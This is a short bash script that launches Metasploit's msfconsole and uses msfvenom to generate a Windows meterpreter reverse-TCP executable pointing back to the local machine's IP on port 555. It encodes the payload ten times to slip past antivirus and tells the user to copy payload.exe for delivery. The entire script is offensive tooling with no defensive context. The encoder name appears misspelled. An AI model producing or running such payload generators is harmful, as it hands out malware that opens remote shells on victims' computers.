#!/bin/bash

# Step 1: Launch msfconsole
msfconsole &

# Wait for msfconsole to boot up (adjust the sleep duration as needed)
sleep 10

# Step 2: Get your IP address
your_ip=$(hostname -I | awk '{print $1}')

# Step 3: Generate payload using msfvenom
msfvenom -p windows/meterpreter/reverse_tcp LHOST="$your_ip" LPORT=555 -f exe -e x86/sikata_ga_nai -i 10 > payload.exe

# Step 4: Display message
echo "Payload generated successfully. Don't forget to copy the payload.exe file."

# Step 5: Close msfconsole
pkill msfconsole
